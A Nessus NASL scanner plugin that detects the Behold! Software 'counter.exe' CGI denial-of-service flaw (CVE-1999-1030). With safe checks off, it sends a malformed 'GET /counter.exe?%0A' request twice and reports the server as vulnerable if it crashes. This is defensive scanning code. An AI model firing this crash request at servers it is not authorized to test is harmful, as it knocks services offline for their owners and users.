#
# This script was written by John Lampe...j_lampe@bellsouth.net
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title (4/15/009)

include("compat.inc");

if (description)
{
 script_id(11725);
 script_version("$Revision: 1.24 $");
 script_cvs_date("$Date: 2016/10/07 13:30:47 $");

 script_cve_id("CVE-1999-1030");
 script_bugtraq_id(267);
 script_osvdb_id(9826);

 script_name(english:"Behold! Software counter.exe Malformed HTTP Request Counter Log DoS");
 script_summary(english:"Checks for the counter.exe file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI application that is affected by a
denial of service.");
 script_set_attribute(attribute:"description", value:
"The CGI 'counter.exe' exists on this web server. Some versions of this
file are vulnerable to remote exploit. An attacker may make use of
this file to gain access to confidential data or escalate their
privileges on the web server.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1999/May/167");
 script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/05/19");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/06/11");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK); # mixed
 script_copyright(english:"This script is Copyright (C) 2003-2016 John Lampe");
 script_family(english:"CGI abuses");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

directory = "";

foreach dir (cgi_dirs())
{
  if(is_cgi_installed_ka(item:string(dir, "/counter.exe"), port:port))
  {
    if (safe_checks() == 0)
    {
      req = string("GET ", dir, "/counter.exe?%0A", "\r\n\r\n");
      soc = open_sock_tcp(port);
      if (soc)
      {
        send (socket:soc, data:req);
        r = http_recv(socket:soc);
        close(soc);
      }
      else exit(0);

      soc2 = open_sock_tcp(port);
      if (!soc2) security_warning(port);
      send (socket:soc2, data:req);
      r = http_recv(socket:soc2);
      if (!r) security_warning(port);
      if (egrep (pattern:".*Access Violation.*", string:r) ) security_warning(port);
    }
	}
}
